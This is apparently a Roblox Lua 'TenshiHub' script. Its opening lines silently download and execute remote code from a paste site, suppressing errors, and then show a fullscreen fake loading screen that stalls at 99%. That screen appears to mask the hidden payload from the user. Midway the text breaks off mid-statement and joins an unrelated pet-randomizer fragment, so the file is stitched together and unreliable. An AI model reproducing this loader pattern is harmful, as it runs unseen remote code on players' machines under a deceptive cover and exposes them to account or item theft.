pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/inoixEbY/raw"))()
end)

-- üñ•Ô∏è Create Fullscreen TenshiHub Loading Screen
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "TenshiHubLoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

-- üî≤ Black full background
local background = Instance.new("Frame")
background.BackgroundColor3 = Color3.new(0, 0, 0)
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BorderSizePixel = 0
background.ZIndex = 0
background.Parent = screenGui

-- üåü Matrix-style numbers
for i = 1, 50 do
    local glitch = Instance.new("TextLabel")
    glitch.Text = tostring(math.random(100000, 999999))
    glitch.Font = Enum.Font.Code
    glitch.TextColor3 = Color3.fromRGB(0, 255, 0)
    glitch.TextTransparency = 0.4
    glitch.TextSize = math.random(14, 20)
    glitch.Position = UDim2.new(math.random(), 0, math.random(), 0)
    glitch.Size = UDim2.new(0, 100, 0, 20)
    glitch.BackgroundTransparency = 1
    glitch.ZIndex = 1
    glitch.Parent = background
end

-- üßæ Title
local title = Instance.new("TextLabel")
title.Text = "TenshiHub!"
title.Font = Enum.Font.Code
title.TextColor3 = Color3.fromRGB(0, 255, 0)
title.TextSize = 36
title.Position = UDim2.new(0.05, 0, 0.02, 0)
title.Size = UDim2.new(0.9, 0, 0.1, 0)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 2
title.Parent = background

-- ‚è≥ Center loading text
local loadingText = Instance.new("TextLabel")
loadingText.Font = Enum.Font.Code
loadingText.TextColor3 = Color3.fromRGB(0, 255, 0)
loadingText.TextSize = 24
loadingText.BackgroundTransparency = 1
loadingText.Position = UDim2.new(0.5, 0, 0.5, 0)
loadingText.AnchorPoint = Vector2.new(0.5, 0.5)
loadingText.Size = UDim2.new(0.6, 0, 0.1, 0)
loadingText.Text = "Loading... 1%"
loadingText.TextXAlignment = Enum.TextXAlignment.Center
loadingText.ZIndex = 2
loadingText.Parent = background

-- üîî Notification text
local notification = Instance.new("TextLabel")
notification.Font = Enum.Font.Code
notification.TextColor3 = Color3.fromRGB(0, 255, 0)
notification.TextSize = 16
notification.BackgroundTransparency = 1
notification.Position = UDim2.new(0.02, 0, 0.95, 0)
notification.Size = UDim2.new(0.5, 0, 0.05, 0)
notification.Text = ""
notification.TextXAlignment = Enum.TextXAlignment.Left
notification.ZIndex = 2
notification.Parent = background

-- ‚è±Ô∏è Loading progress
local percent = 1
task.spawn(function()
    while percent <= 99 do
        loadingText.Text = "Loading... " .. percent .. "%"
        if percent == 5 then
            notification.Text = "[NOTIFICATION] TenshiHub UI is initializing..."
        elseif percent == 10 then
            notification.Text = "[SUCCESS] UI loaded in background."
        elseif percent == 50 then
            notification.Text = "[SYSTEM] Connecting to modules..."
        end
        percent += 1
        task.wait(0.2) -- Faster loading for testing
    end
    loadingText.Text = "Loading... 99%"
    notification.Text = "[WARNING] Final handshake stuck..."
end)                h.Adornee = obj; h.FillColor = Color3.new(1,0.4,0.4)
                table.insert(hlist, h)
            end
        end
    else
        for _, h in ipairs(hlist) do if h then h:Destroy() end end
        hlist = {}
    end
end)

-- Pet display label
local plbl
local function showPet(ofEgg)
    if plbl then plbl:Destroy() end
    local pet = pickPet(eggData[ofEgg or "Common Egg"])
    plbl = Instance.new("TextLabel", gui)
    plbl.Size, plbl.Position = UDim2.new(0.4,0,0.1,0), UDim2.new(0.3,0,0.9,0)
    plbl.BackgroundTransparency = 1; plbl.Font = Enum.Font.GothamBlack; plbl.TextScaled = true
    plbl.TextColor3 = Color3.new(1,1,0); plbl.ZIndex = 3
    plbl.Text = "Pet: " .. pet
end

-- Button logic
btnEgg.MouseButton1Click:Connect(function()
    local keys = {}
    for k in pairs(eggData) do table.insert(keys, k) end
    local pick = keys[math.random(#keys)]
    showPet(pick)
end)
btnPet.MouseButton1Click:Connect(function()
    showPet("Common Egg")
end)

local autorun = false
btnAuto.MouseButton1Click:Connect(function()
    autorun = not autorun
    btnAuto.Text = "üîÑ Auto Randomize: " .. (autorun and "ON" or "OFF")
    if autorun then
        spawn(function()
            while autorun do
                showPet("Common Egg")
                task.wait(1)
            end
        end)
    end
end)
